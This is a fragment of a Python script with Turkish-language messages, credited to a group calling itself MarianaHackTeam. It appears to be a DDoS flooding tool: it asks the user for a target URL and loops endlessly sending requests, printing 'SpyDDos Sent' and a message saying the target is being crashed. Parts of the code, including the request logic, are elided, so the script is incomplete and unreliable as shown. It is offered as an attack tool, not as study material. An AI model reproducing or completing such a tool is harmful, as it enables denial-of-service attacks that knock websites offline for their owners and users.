...
print("""Copyright By Hyperinios & Spy """)

print("Telegram:byhyperinios")            

print("MarianaHackTeam Tarafından üretilmiştir...")



url = input("URL Girin Lütfen:  ").strip()
    ...
    def run(self):
        ...
        while True:
            try:
                ...
                count += 1
                print ("{0} SpyDDos Sent".format(count))
            except requests.exceptions.ConnectionError:
                print ("[Hedef URL Çökertiliyor]")
                pass
            except requests.exceptions.InvalidSchema:
                print ("[URL Hata]")
                raise SystemExit()
            except ValueError:
                print ("[URL'nizi kontrol edin]")
                raise SystemExit()
...
while True:
    try:
        ...
        exit("[Kullanıcı Tarafından İptal Edildi]")
        raise SystemExit()
